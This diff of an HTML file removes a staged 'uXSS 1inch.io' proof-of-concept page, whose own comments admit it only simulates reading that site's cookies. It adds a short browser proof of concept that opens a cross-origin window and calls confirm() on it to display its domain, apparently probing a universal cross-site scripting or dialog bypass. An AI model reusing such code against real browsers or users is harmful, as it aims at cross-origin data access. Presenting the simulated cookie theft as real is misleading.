@@ -1,80 +1,12 @@
-<!DOCTYPE html>
-<html lang="id">
-<head>
-    <meta charset="UTF-8">
-    <title>uXSS 1inch Proof of Concept</title>
-    <style>
-        body { 
-            background-color: #1b1e23; 
-            color: #d1d4dc; 
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
-            padding: 20px;
-        }
-        .header { color: #ff4d4d; font-size: 14px; font-weight: bold; margin-bottom: 10px; }
-        .instruction { margin-bottom: 15px; font-size: 13px; }
-        .btn-group button { 
-            background: #fff; border: 1px solid #ccc; border-radius: 10px; 
-            padding: 2px 8px; font-size: 11px; cursor: pointer; margin-right: 5px;
-        }
-        .output-box { 
-            border: 1px solid #444; margin-top: 15px; padding: 10px; 
-            background: #24292f; min-height: 150px;
-        }
-        .domain-title { font-weight: bold; margin-bottom: 5px; display: block; font-size: 13px; }
-        textarea { 
-            width: 100%; height: 100px; background: transparent; 
-            color: #00ff00; border: none; outline: none; resize: none; font-family: monospace;
-        }
-        hr { border: 0; border-top: 1px solid #444; margin: 20px 0; }
-    </style>
-</head>
 <body>
-
-    <div class="header">uXSS 1inch.io Proof of Concept</div>
-    
-    <div class="instruction">
-        Silakan klik domain yang ingin Anda periksa kerentanannya:
-    </div>
-
-    <div class="btn-group">
-        <button onclick="checkVulnerability('1inch.io')">1inch.io</button>
-        <button onclick="checkVulnerability('app.1inch.io')">app.1inch.io</button>
-    </div>
-
-    <div class="output-box">
-        <span class="domain-title">Here are cookies from <span id="currentDomain">https://1inch.io</span> :</span>
-        <textarea id="cookieResult" readonly placeholder="Menunggu perintah..."></textarea>
-    </div>
-
-    <hr>
-
-    <div class="instruction">
-        <strong>Status XHR Response:</strong>
-        <div id="xhrStatus" style="font-family: monospace; font-size: 12px; margin-top: 10px; color: #888;">
-            &lt;html&gt;&lt;body&gt;No active request&lt;/body&gt;&lt;/html&gt;
-        </div>
-    </div>
-
-    <script>
-        function checkVulnerability(domain) {
-            document.getElementById('currentDomain').innerText = "https://" + domain;
-            
-            // Simulasi pengambilan cookie
-            // CATATAN: 'document.cookie' hanya akan mengambil cookie situs ini sendiri, 
-            // bukan cookie asli milik 1inch, kecuali jika browser Anda memiliki bug uXSS.
-            const cookies = document.cookie;
-            
-            const output = document.getElementById('cookieResult');
-            if (cookies) {
-                output.value = cookies;
-            } else {
-                output.value = "KONEKSI GAGAL: Browser aman (SOP aktif). Tidak dapat mengakses data dari " + domain;
-            }
-
-            // Simulasi respon XHR
-            document.getElementById('xhrStatus').innerText = "<html><body>Requesting data from " + domain + "... (403 Forbidden)</body></html>";
-        }
-    </script>
-
+  <button onclick="fsBypass(document.documentElement);">click Here</button>
+  <script>
+    function fsBypass(element) {
+      var x = window.open("http://abc.xyz", "_target");
+      x.confirm();
+      setTimeout(function() {
+        x.confirm(x.document.domain);
+      }, 70)
+    }
+  </script>
 </body>
-</html>
